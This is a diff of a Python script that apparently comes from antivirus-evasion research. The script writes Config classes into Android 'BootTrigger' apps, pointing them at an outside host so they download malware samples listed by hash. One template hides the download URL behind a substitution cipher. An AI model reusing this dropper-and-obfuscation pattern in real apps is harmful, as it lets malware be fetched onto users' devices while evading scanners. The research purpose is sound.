@@ -8,13 +8,13 @@ INDIRECT_APP_CONFIG = 'BootTrigger/app/src/main/java/com/example/boottrigger/Con
 TEMPLATE = 'package {};\npublic class Config {{\n\tpublic static String TOUCH_PAGE = "http://www.dreamfirm.com/test{}.php";\n\tpublic static String DOWNLOAD_LINK = "http://www.dreamfirm.com/726a2eedb9df3d63ec1b4a7d774a799901f1a2b9.php?sha={}";\n}}'
 
 SHA_LIST = [item.strip() for item in open('dynamic_malware.txt').readlines()]
-OUTPUT_FOLDER = '/home/data/guozhu/AVScale/3429436173_impillar2017/exp_apps/apps_dynamic_host/'
+OUTPUT_FOLDER = '/home/data/XXX/exp_apps/apps_dynamic_host/'
 
 
-OUTPUT_FOLDER2 = '/home/data/guozhu/AVScale/3429436173_impillar2017/exp_apps/apps_dynamic_trigger/'
+OUTPUT_FOLDER2 = '/home/data/XXX/exp_apps/apps_dynamic_trigger/'
 TEMPLATE2 = 'package {};\npublic class Config {{\n\tpublic static String TOUCH_PAGE = "http://www.dreamfirm.com/cello.php?act=start&sha={}&name={}";\n\tpublic static String DOWNLOAD_LINK = "http://www.dreamfirm.com/cello.php?act=download&sha={}&name={}";\n}}'
 
-OUTPUT_FOLDER3 = '/home/data/guozhu/AVScale/3429436173_impillar2017/exp_apps/apps_dynamic_trigger2/'
+OUTPUT_FOLDER3 = '/home/data/XXX/exp_apps/apps_dynamic_trigger2/'
 TEMPLATE3 = 'package {}; public class Config {{static String domain = "s..61kkgggo8f&qdz?fdoacdk"; static String page = "9?ce?=o6s6"; static String p1 = "7qa.l"; static String p2 = "pvsql"; static String p3 = "p=qd&l"; public static String TOUCH_PAGE = ""; public static String DOWNLOAD_LINK = ""; static String source="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.?=&".toLowerCase(); static String target="Q5A8&ZWS?0XED=C6RFV.T9GB/Y4H:NU3J2MI1KO7LP".toLowerCase(); static{{ TOUCH_PAGE = unobfuscate(domain) + unobfuscate(page)+unobfuscate(p1) + "{}" + unobfuscate(p2) + "{}" + unobfuscate(p3) + "{}";DOWNLOAD_LINK = unobfuscate(domain) + unobfuscate(page) + unobfuscate(p1) + "{}" + unobfuscate(p2) + "{}" + unobfuscate(p3) + "{}";}}    public static String unobfuscate(String s) {{ char[] result= new char[s.length()]; for (int i=0;i<s.length();i++) {{ char c=s.charAt(i); int index=target.indexOf(c); result[i]=source.charAt(index);  }} return new String(result);}} }}'
 
 def main():
